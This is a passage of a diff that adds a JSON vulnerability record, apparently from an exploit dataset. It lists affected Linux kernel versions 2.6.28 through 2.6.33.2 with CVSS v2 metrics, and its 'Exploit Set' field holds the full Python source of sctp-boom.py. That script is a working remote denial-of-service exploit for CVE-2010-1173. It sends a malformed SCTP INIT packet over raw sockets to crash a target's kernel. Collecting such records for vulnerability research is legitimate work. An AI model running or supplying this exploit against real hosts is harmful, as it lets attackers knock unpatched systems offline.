+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28:rc2:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28:rc3:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28:rc4:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28:rc5:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28:rc6:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28:rc7:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28.8:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28.8"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28.9:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28.9"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28.10:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28.10"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.29:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.29"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.29:git1:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.29"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.29:rc1:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.29"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.29:rc2:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.29"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.29:rc2_git7:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.29"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.29:rc8-kk:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.29"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.29.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.29.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.29.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.29.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.29.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.29.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.29.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.29.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.29.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.29.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.29.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.29.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.30:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.30"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.30:rc1:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.30"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.30:rc2:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.30"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.30:rc3:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.30"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.30:rc5:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.30"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.30:rc6:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.30"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.30:rc7-git6:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.30"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.30.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.30.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.30.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.30.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.30.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.30.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.30.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.30.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.30.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.30.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.30.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.30.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.30.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.30.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.30.8:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.30.8"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.30.9:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.30.9"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.30.10:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.30.10"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31:rc1:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31:rc2:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31:rc3:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31:rc4:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31:rc5:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31:rc6:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31:rc7:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31:rc8:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31.8:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31.8"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31.9:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31.9"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31.10:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31.10"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31.11:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31.11"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.31.12:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.31.12"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32:git-6:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32:rc1:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32:rc3:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32:rc4:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32:rc5:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32:rc6:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32:rc7:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32:rc8:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32.8:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32.8"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32.9:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32.9"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.32.10:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.32.10"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.33:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.33"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.33:rc1:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.33"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.33:rc2:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.33"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.33:rc3:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.33"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.33:rc4:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.33"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.33:rc5:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.33"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.33:rc6:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.33"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.33:rc7:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.33"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.33:rc8:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.33"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.33.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.33.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.33.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.33.2"
+        }
+      ],
+      "CVSS Metric": {
+        "cvssMetricV2": {
+          "Primary": {
+            "source": "nvd@nist.gov",
+            "type": "Primary",
+            "baseSeverity": "HIGH",
+            "exploitabilityScore": 8.6,
+            "impactScore": 6.9,
+            "acInsufInfo": false,
+            "obtainAllPrivilege": false,
+            "obtainUserPrivilege": false,
+            "obtainOtherPrivilege": false,
+            "userInteractionRequired": false,
+            "version": "2.0",
+            "vectorString": "AV:N/AC:M/Au:N/C:N/I:N/A:C",
+            "baseScore": 7.1,
+            "accessVector": "NETWORK",
+            "accessComplexity": "MEDIUM",
+            "authentication": "NONE",
+            "confidentialityImpact": "NONE",
+            "integrityImpact": "NONE",
+            "availabilityImpact": "COMPLETE"
+          }
+        }
+      }
+    },
+    "Patch Set": {},
+    "Exploit Set": {
+      "Exploit Code": [
+        "# From: http://jon.oberheide.org/files/sctp-boom.py\n#!/usr/bin/env python\n\n''' \n  sctp-boom.py\n \n  Linux Kernel <= 2.6.33.3 SCTP INIT Remote DoS\n  Jon Oberheide <jon@oberheide.org>\n  http://jon.oberheide.org\n  \n  Information:\n \n    http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1173\n\n    The sctp_process_unk_param function in net/sctp/sm_make_chunk.c in the\n    Linux kernel 2.6.33.3 and earlier, when SCTP is enabled, allows remote \n    attackers to cause a denial of service (system crash) via an SCTPChunkInit\n    packet containing multiple invalid parameters that require a large amount \n    of error data. \n\n  Usage:\n \n    $ python sctp-boom.py 1.2.3.4 19000\n    [+] sending malformed SCTP INIT msg to 1.2.3.4:19000\n    ...\n    [+] kernel should have panicked on remote host 1.2.3.4\n\n  Requirements:\n    \n    * dnet: http://libdnet.sourceforge.net/\n    * dpkt: http://code.google.com/p/dpkt/\n\n''' \n\nimport os, sys, socket\n\ndef err(txt):\n    print '[-] error: %s' % txt\n    sys.exit(1)\n\ndef msg(txt):\n    print '[+] %s' % txt\n\ndef usage():\n    print >> sys.stderr, 'usage: %s host port' % sys.argv[0]\n    sys.exit(1)\n\ntry:\n    import dpkt\nexcept ImportError:\n    err('requires dpkt library: http://code.google.com/p/dpkt/')\n\ntry:\n    import dnet\nexcept ImportError:\n    try:\n        import dumbnet as dnet\n    except ImportError:\n        err('requires dnet library: http://libdnet.sourceforge.net/')\n\ndef main():\n    if len(sys.argv) != 3:\n        usage()\n\n    host = sys.argv[1]\n    port = int(sys.argv[2])\n\n    try:\n        sock = dnet.ip()\n        intf = dnet.intf()\n    except OSError:\n        err('requires root privileges for raw socket access')\n\n    dst_addr = socket.gethostbyname(host)\n    interface = intf.get_dst(dnet.addr(dst_addr))\n    src_addr = interface['addr'].ip\n\n    msg('sending malformed SCTP INIT msg to %s:%s' % (dst_addr, port))\n\n    invalid = ''\n    invalid += '\\x20\\x10\\x11\\x73'\n    invalid += '\\x00\\x00\\xf4\\x00'\n    invalid += '\\x00\\x05'\n    invalid += '\\x00\\x05'\n    invalid += '\\x20\\x10\\x11\\x73'\n\n    for i in xrange(20):\n        invalid += '\\xc0\\xff\\x00\\x08\\xff\\xff\\xff\\xff'\n\n    init = dpkt.sctp.Chunk()\n    init.type = dpkt.sctp.INIT\n    init.data = invalid\n    init.len = len(init)\n\n    sctp = dpkt.sctp.SCTP()\n    sctp.sport = 0x1173\n    sctp.dport = port\n    sctp.data = [ init ]\n\n    ip = dpkt.ip.IP()\n    ip.src = src_addr\n    ip.dst = dnet.ip_aton(dst_addr)\n    ip.p = dpkt.ip.IP_PROTO_SCTP\n    ip.data = sctp\n    ip.len = len(ip)\n\n    print `ip`\n\n    pkt = dnet.ip_checksum(str(ip))\n    sock.send(pkt)\n\n    msg('kernel should have panicked on remote host %s' % (dst_addr))\n\nif __name__ == '__main__':\n    main()"
+      ]
+    }
+  }
+}
